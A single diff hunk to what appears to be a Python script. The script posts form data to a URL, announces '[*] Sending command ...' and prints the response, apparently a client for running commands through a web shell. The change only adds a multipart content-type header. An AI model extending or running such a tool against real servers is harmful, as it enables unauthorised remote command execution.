@@ -32,7 +32,7 @@ else:
             "fuck": "",
             "a" : ""
         }
-        post_Request = s.post(url, data=post_data)
+        post_Request = s.post(url, data=post_data, headers={'content-type': 'multipart/form-data'})
         if post_Request.status_code==200:
             print("[*] Sending command ... ")
             print(post_Request.text)
